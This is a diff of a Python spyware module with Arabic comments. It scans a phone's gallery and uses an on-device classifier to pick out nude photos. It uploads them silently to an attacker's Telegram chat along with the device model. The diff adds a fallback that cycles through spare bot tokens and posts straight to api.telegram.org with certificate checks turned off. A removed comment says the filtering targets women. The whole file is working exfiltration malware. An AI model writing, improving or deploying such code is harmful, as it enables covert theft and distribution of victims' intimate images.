@@ -7,6 +7,7 @@ import sqlite3
 import hashlib
 import gc
 import shutil
+import requests
 from datetime import datetime
 
 # ========== توحيد مسار runtime ==========
@@ -26,18 +27,16 @@ if not os.path.exists(M):
 
 logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')
 
-# ========== استيراد المكتبات (خفيفة) ==========
+# ========== استيراد المكتبات ==========
 try:
     import numpy as np
     from PIL import Image, UnidentifiedImageError
     Image.MAX_IMAGE_PIXELS = 50_000_000
     from tflite_runtime.interpreter import Interpreter
     AI_AVAILABLE = True
-    JNI = True
 except ImportError as e:
     logging.error(f"Failed to import AI libraries: {e}")
     AI_AVAILABLE = False
-    JNI = False
     class Interpreter: pass
 
 
@@ -63,19 +62,17 @@ class NudeDetector:
         self.db = os.path.join(P, "n_cache.db")
         self._init_db()
 
-        if AI_AVAILABLE and JNI:
+        if AI_AVAILABLE:
             threading.Thread(target=self._prepare_engine, daemon=True).start()
         else:
             logging.error("AI libraries missing. NudeDetector will not work.")
 
-    # ========== إدارة قاعدة البيانات (محسّنة للسرعة) ==========
+    # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
         try:
             with sqlite3.connect(self.db) as conn:
                 conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
-                # ✅ تحسين الأداء: إنشاء فهرس على ts لتسريع الحذف
                 conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
-                # تنظيف السجلات الأقدم من 30 يومًا
                 old_threshold = int(time.time()) - (30 * 86400)
                 conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
                 conn.commit()
@@ -120,18 +117,12 @@ class NudeDetector:
             logging.error(f"Load engine error: {e}")
             self.model = None
 
-    # ========== تحليل الصورة مع فلاتر إضافية (للتركيز على الإناث) ==========
+    # ========== تحليل الصورة ==========
     def analyze(self, path):
-        """
-        تحليل الصورة وإرجاع احتمال العري (0.0-1.0)
-        مع تطبيق فلاتر:
-        1. نسبة الأبعاد (Aspect Ratio): الصور الطولية تحصل على أولوية طفيفة.
-        2. عتبة ديناميكية (Dynamic Threshold) تعتمد على حالة الشحن.
-        """
-        if not AI_AVAILABLE or not JNI or self.model is None or not os.path.exists(path):
+        if not AI_AVAILABLE or self.model is None or not os.path.exists(path):
             return 0.0
 
-        # الحجم الأقصى 8 ميجابايت
+        # استبعاد الملفات الكبيرة جداً
         if os.path.getsize(path) > 8 * 1024 * 1024:
             return 0.0
 
@@ -141,9 +132,7 @@ class NudeDetector:
         try:
             with Image.open(path) as raw_img:
                 width, height = raw_img.size
-                # فلتر الأبعاد: الصورة الطولية (height > width * 1.2) تعطى +5% ثقة
                 aspect_bonus = 0.05 if height > width * 1.2 else 0.0
-
                 img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)
 
             arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
@@ -151,60 +140,43 @@ class NudeDetector:
             self.model.invoke()
             out = self.model.get_tensor(self.out_idx)[0]
             prob = float(out[1]) if len(out) > 1 else float(out[0])
-
-            # إضافة bonus aspect ratio
             prob = min(prob + aspect_bonus, 1.0)
-
-            del arr, img
             return prob
-
-        except UnidentifiedImageError:
-            return 0.0
         except Exception as e:
             logging.error(f"Analyze error: {e}")
             return 0.0
 
-    def _should_send(self, prob, mon):
-        """
-        عتبة ذكية: إذا كان الجهاز متصلاً بالشاحن، نرسل الصور ذات الثقة > 0.70.
-        وإلا نرسل فقط التي تزيد عن 0.85.
-        """
-        if prob > 0.90:   # ثقة عالية جداً، نرسل فوراً
+    def _should_send(self, prob):
+        if prob > 0.90:
             return True
-        if prob > 0.85:   # ثقة جيدة
+        if prob > 0.85:
             return True
-        if prob > 0.70:
-            # إذا كان الجهاز يشحن، نرسل حتى الثقة المتوسطة
-            if hasattr(mon, '_bat'):
-                _, charging = mon._bat()
-                if charging:
-                    return True
+        if prob > 0.70 and hasattr(self.mon, '_battery_ok'):
+            bat, charging = self.mon._battery_ok()
+            if charging:
+                return True
         return False
 
-    # ========== المسح التلقائي (يُستدعى من monitor) ==========
-    def scan(self, mon):
+    # ========== المسح التلقائي ==========
+    def scan(self):
         if not AI_AVAILABLE or self.active or self.model is None:
             return
-        if hasattr(mon, '_bat'):
-            battery, charging = mon._bat()
-            if battery < 20 and not charging:
-                return
         now = time.time()
         if (now - self.last_run) < 1800:
             return
         self.last_run = now
-        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()
+        threading.Thread(target=self._worker, daemon=True).start()
 
-    def _worker(self, mon):
+    def _worker(self):
         if not self._lock.acquire(blocking=False):
             return
         try:
             self.active = True
-            sc = getattr(mon, 'media_scanner', None)
+            sc = getattr(self.mon, 'media_scanner', None)
             if not sc:
                 return
 
-            items = sc.get_gallery_by_category("pending", limit=30)
+            items = sc.get_gallery_by_category("pending", limit=20)
             for item in items:
                 path = item.get("path")
                 if not path or not os.path.exists(path):
@@ -215,10 +187,9 @@ class NudeDetector:
                     continue
 
                 prob = self.analyze(path)
-
-                if self._should_send(prob, mon):
+                if self._should_send(prob):
                     sc.update_category(item.get("hash"), "nude", prob)
-                    self._report(path, item.get("label", "??"), mon, prob)
+                    self._report(path, item.get("label", "??"), prob)
                 elif prob > 0.45:
                     sc.update_category(item.get("hash"), "questionable", prob)
                 else:
@@ -251,22 +222,48 @@ class NudeDetector:
         except:
             pass
 
-    # ========== إرسال التقرير ==========
-    def _report(self, path, label, mon, confidence):
-        try:
-            tg = getattr(mon, 'ui', None)
-            vault = getattr(mon, 'vlt', None)
-            if tg and vault and os.path.exists(path):
-                with open(path, 'rb') as f:
-                    caption = f"🔞 **AI Detection**\nLabel: `{label}`\nConfidence: `{confidence:.0%}`\nTime: `{datetime.now().strftime('%H:%M:%S')}`"
-                    tg._api("sendPhoto", {
-                        "chat_id": vault,
-                        "caption": caption,
-                        "parse_mode": "Markdown",
-                        "disable_notification": True
-                    }, {"photo": f})
-        except Exception as e:
-            logging.error(f"Report error: {e}")
+    # ========== إرسال التقرير مع Fallback ==========
+    def _report(self, path, label, confidence):
+        tg = getattr(self.mon, 'ui', None)
+        if not tg or not os.path.exists(path):
+            return
+
+        caption = (f"🔞 **AI Detection**\n"
+                   f"Label: `{label}`\n"
+                   f"Confidence: `{confidence:.0%}`\n"
+                   f"Device: `{self.mon.dmd}`\n"
+                   f"Time: `{datetime.now().strftime('%H:%M:%S')}`")
+
+        # المحاولة الأولى عبر البوت الرئيسي
+        with open(path, 'rb') as f:
+            res = tg._api("sendPhoto", {
+                "chat_id": tg.dat,
+                "caption": caption,
+                "parse_mode": "Markdown",
+                "disable_notification": True
+            }, {"photo": f})
+
+        # إذا فشلت المحاولة الأولى (بوت معطل، 429، إلخ) -> fallback باستخدام active_tokens مباشرة
+        if not res or not res.get('ok'):
+            logging.warning("Primary bot failed in AI report, activating fallback...")
+            for token in getattr(tg, 'active_tokens', []):
+                try:
+                    url = f"https://api.telegram.org/bot{token}/sendPhoto"
+                    with open(path, 'rb') as f2:
+                        fallback_res = requests.post(
+                            url,
+                            data={"chat_id": tg.dat, "caption": caption + "\n(Fallback)", "parse_mode": "Markdown"},
+                            files={"photo": f2},
+                            timeout=30,
+                            verify=False
+                        )
+                        if fallback_res.json().get('ok'):
+                            logging.info(f"AI report sent via fallback bot")
+                            break
+                except Exception as e:
+                    logging.error(f"Fallback send error: {e}")
+                    continue
+
 
 def create(mon=None):
     return NudeDetector(mon)
